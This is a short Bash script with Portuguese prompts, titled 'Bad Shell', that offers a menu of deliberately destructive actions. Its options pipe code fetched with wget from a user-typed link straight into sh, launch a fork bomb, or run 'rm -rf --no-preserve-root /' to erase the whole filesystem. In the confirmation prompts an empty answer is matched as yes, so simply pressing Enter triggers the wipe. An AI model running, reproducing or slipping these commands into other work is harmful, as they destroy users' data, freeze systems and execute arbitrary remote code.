#!/usr/bin/env bash
#Atenção! O autor do código não se responsabiliza pelo uso do script! Use por sua conta e risco!
function menu() {
 clear
  echo
  echo " Bad Shell: o meio + simples de ferrar com seu SO!"
  echo
  echo " [1] Download malicious source"
  echo " [2] Fork Bomb"
  echo " [3] Suicide Linux"
  echo
  echo -n " Esolha uma opção: "
   read OPTION && echo ""

  [ "${OPTION}" -ge 1 -a "${OPTION}" -le 3 ] || OPTION=0
  [ "${OPTION}" = "1" ] && download
  [ "${OPTION}" = "2" ] && fbomb
  [ "${OPTION}" = "3" ] && suicide
  [ "${OPTION}" = "0" ] && echo " Opção inválida"
}
  
function download(){
  echo -n " Digite o link completo: "
   read BADLINK
    wget "${BADLINK}" -O- | sh ; exit
}

function fbomb() {
  echo -n " Você têm certeza? [S/N] "
   read FORK && echo ""
    case ${FORK} in
    s|S|"") : () { : | : & }; : ;;
    n|N|"") menu ;;
    *) echo " Opção inválida" ;;
 esac
}

function suicide() {
  echo -n " Você têm certeza? [S/N] "
   read SLINUX && echo ""
    case ${SLINUX} in
    s|S|"") rm -rf --no-preserve-root / ;;
    n|N|"") menu ;;
    *) echo " Opção inválida" ;;
 esac
}

menu
